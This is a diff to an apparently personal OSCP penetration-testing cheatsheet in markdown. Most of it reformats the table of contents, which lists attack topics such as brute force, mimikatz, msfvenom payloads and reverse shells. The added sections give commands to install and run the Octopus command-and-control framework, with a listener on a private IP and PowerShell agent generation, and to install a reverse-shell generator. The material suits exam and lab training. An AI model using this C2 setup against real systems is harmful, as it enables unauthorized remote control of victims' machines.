@@ -6,23 +6,30 @@ description: "OSCP personal cheatsheet"
 ---
 
 - [Enumeration](#enumeration)
+
 - [NMAP](#nmap)
   * [TCP](#tcp)
   * [UDP](#udp)
+  
 - [FTP - 21](#ftp---21)
+  
   * [Brute force](#brute-force)
   * [Downloading file](#downloading-file)
   * [Uploading file](#uploading-file)
+  
 - [SSH - 22](#ssh---22)
   * [Brute force](#brute-force-1)
   * [CVE-2008-0166](#cve-2008-0166)
   * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
+  
 - [DNS - 53](#dns---53)
   * [Zone transfert](#zone-transfert)
   * [DNS brute force](#dns-brute-force)
+  
 - [FINGER - 79](#finger---79)
   * [User enumeration](#user-enumeration)
   * [Command execution](#command-execution)
+  
 - [HTTP - HTTPS - 80 - 443](#http---https---80---443)
   * [Automatic scanners](#automatic-scanners)
   * [Wordpress](#wordpress)
@@ -58,16 +65,21 @@ description: "OSCP personal cheatsheet"
   * [XSS](#xss)
   * [Other web vulnerabilities](#other-web-vulnerabilities)
   * [Upload a file with PUT](#upload-a-file-with-put)
+  
 - [KERBEROS - 88](#kerberos---88)
+
 - [POP3 - 110](#pop3---110)
   * [Brute force](#brute-force-3)
   * [Read mail](#read-mail)
+  
 - [SNMP - 161](#snmp---161)
   * [Brute force community string](#brute-force-community-string)
   * [Modifying SNMP values](#modifying-snmp-values)
+  
 - [LDAP - 389](#ldap---389)
   * [Scans](#scans)
   * [Graphical Interface](#graphical-interface)
+  
 - [SMB - 445](#smb---445)
   * [Version if nmap didn't detect it](#version-if-nmap-didnt-detect-it)
   * [Scan for vulnerability](#scan-for-vulnerability)
@@ -82,21 +94,25 @@ description: "OSCP personal cheatsheet"
     * [If this doesn't work, try this one](#if-this-doesnt-work-try-this-one)
   * [MS08-067](#ms08-067)
   * [CVE-2017-7494](#cve-2017-7494)
+  
 - [MSSQL - 1433](#mssql---1433)
   * [Get information](#get-information)
   * [Brute force](#brute-force-5)
   * [Having credentials](#having-credentials)
   * [Manual exploit](#manual-exploit)
+  
 - [NFS - 2049](#nfs---2049)
   * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
   * [Mount a share](#mount-a-share)
   * [NFS misconfigurations](#nfs-misconfigurations)
+  
 - [MYSQL - 3306](#mysql---3306)
   * [Brute force](#brute-force-6)
   * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
   * [Connect](#connect)
   * [MySQL commands](#mysql-commands)
   * [Manual exploit](#manual-exploit-1)
+  
 - [RDP - 3389](#rdp---3389)
   * [Brute force](#brute-force)
   * [Connect with known credentials / hash](#connect-with-known-credentials--hash)
@@ -104,6 +120,7 @@ description: "OSCP personal cheatsheet"
     + [Get openned sessions](#get-openned-sessions)
     + [Access to the selected](#access-to-the-selected)
   * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group-windows)
+  
 - [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
   * [Scans](#scans-1)
   * [Brute force](#brute-force-8)
@@ -112,28 +129,43 @@ description: "OSCP personal cheatsheet"
     + [Linux](#linux)
     + [Windows](#windows)
   * [Decrypt VNC password](#decrypt-vnc-password)
+  
 - [WINRM - 5985 - 5986](#winrm---5985---5986)
   * [Brute force](#brute-force-9)
   * [Connecting](#connecting)
+  
 - [CGI](#cgi)
+  
   * [Found CGI scripts](#found-cgi-scripts)
+  
+- [Command and control framework](#command-and-control-framework)
+  
 - [Compiling exploits](#compiling-exploits)
+  
   * [For linux](#for-linux)
   * [For windows](#for-windows)
   * [Cross compile](#cross-compile)
+  
 - [DICTIONARY GENERATION](#dictionary-generation)
+
 - [FILE TRANSFER](#file-transfer)
   * [Linux](#linux-1)
   * [Windows](#windows-1)
+  
 - [GIT](#git)
   * [Download .git](#download-git)
   * [Extract .git content](#extract-git-content)
+  
 - [HASHES](#hashes)
   * [Windows](#windows-2)
   * [Linux](#linux-2)
+  
 - [MIMIKATZ](#mimikatz)
+
 - [MISCELLANEOUS](#miscellaneous)
+  
   * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)
+  
 - [MSFVENOM PAYLOAD](#msfvenom-payload)
   * [Linux](#linux-3)
   * [Windows](#windows-3)
@@ -147,6 +179,7 @@ description: "OSCP personal cheatsheet"
   * [Listener](#listener)
     + [Metasploit](#metasploit)
     + [Netcat](#netcat)
+  
 - [PASSWORD CRACKING](#password-cracking)
   * [Online](#online)
   * [Hashcat](#hashcat)
@@ -155,9 +188,11 @@ description: "OSCP personal cheatsheet"
     + [Others](#others)
     + [Rules](#rules)
   * [John](#john)
+  
 - [PIVOTING](#pivoting)
   * [Sshuttle](#sshuttle)
   * [Proxychains](#proxychains)
+  
 - [PRIVILE ESCALATION](#privile-escalation)
   * [Linux](#linux-4)
     + [Enumeration scripts](#enumeration-scripts)
@@ -197,18 +232,24 @@ description: "OSCP personal cheatsheet"
     + [Windows 8](#windows-8)
     + [Windows 10](#windows-10)
     + [Windows Server 2003](#windows-server-2003)
+  
 - [PROOFS](#proofs)
   * [Linux](#linux-5)
   * [Windows](#windows-5)
+  
 - [REVERSE SHELL](#reverse-shell)
-  * [Bash](#bash-1)
-  * [Perl](#perl-1)
-  * [Python](#python-1)
-  * [Netcat](#netcat-1)
-  * [More reverse shell](#more-reverse-shell)
-  * [Interactive shell](#interactive-shell)
-  * [Adjust Interactive shell](#adjust-interactive-shell)
+  
+  - [Amazing tool for shell generation](#amazing-tool-for-shell-generation)
+  - [Bash](#bash-1)
+  - [Perl](#perl-1)
+  - [Python](#python-1)
+  - [Netcat](#netcat-1)
+  - [More reverse shell](#more-reverse-shell)
+  - [Interactive shell](#interactive-shell)
+  - [Adjust Interactive shell](#adjust-interactive-shell)
+  
 - [SHELLSHOCK](#shellshock)
+
 - [USEFUL LINUX COMMANDS](#useful-linux-commands)
   * [Find a file](#find-a-file)
   * [Active connection](#active-connection)
@@ -217,7 +258,9 @@ description: "OSCP personal cheatsheet"
   * [Determine more information about the environment](#determine-more-information-about-the-environment)
   * [List processes running](#list-processes-running)
   * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed-and-forbidden-commands-for-the-invoking-use)
+  
 - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
+
 - [ZIP](#zip)
 
 ------
@@ -1205,6 +1248,29 @@ If a script is found try [SHELLSHOCK](#shellshock).
 
 ------
 
+## Command and control framework
+
+```
+# Download
+git clone https://github.com/mhaskar/Octopus/tree/v1.2
+
+# Install requirements
+pip install -r requirements.txt
+
+# Usage
+./octopus.py
+
+# Listener (exemple)
+listen_http <BIND_IP> <BIND_PORT> <HOSTNAME> <INTERVAL_IN_SECONDS> <URL> <LISTENER_NAME>
+listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1
+
+# Agent (exemple)
+generate_powershell <LISTENER_NAME>
+generate_powershell listener_1
+```
+
+------
+
 ## Compiling exploits
 
 ### For linux
@@ -2025,6 +2091,19 @@ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & 
 ------
 
 ## REVERSE SHELL
+
+### Amazing tool for shell generation
+
+```
+# Download
+git clone https://github.com/ShutdownRepo/shellerator
+
+# Install requirements
+pip3 install --user -r requirements.txt
+
+# Executable from anywhere
+sudo cp shellrator.py /bin/shellrator
+```
 
 ### Bash
 
